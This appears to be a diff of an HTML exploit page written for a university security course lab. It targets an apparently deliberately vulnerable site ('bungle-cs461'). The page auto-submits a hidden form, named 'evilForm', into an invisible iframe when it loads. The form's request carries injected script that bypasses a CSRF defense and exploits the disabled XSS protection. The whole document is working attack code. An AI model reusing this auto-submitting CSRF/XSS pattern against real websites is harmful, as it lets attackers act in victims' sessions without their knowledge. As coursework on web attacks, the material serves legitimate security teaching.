@@ -6,7 +6,7 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 </head>
 
-<body>
+<body onload="document.forms['evilForm'].submit()">
 
 <form action="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0" method="GET"
       id="evilForm" target="YouCannotSeeMe">
@@ -41,10 +41,7 @@
         }
         load();
     </script>"/>
-    <input type="submit" formaction="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0"
-           hidden onload="function f() {
-             document.forms['evilForm'].submit();
-           }"/>
+    <input hidden type="submit" formaction="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0"/>
 </form>
 
 <iframe name="YouCannotSeeMe" hidden></iframe>
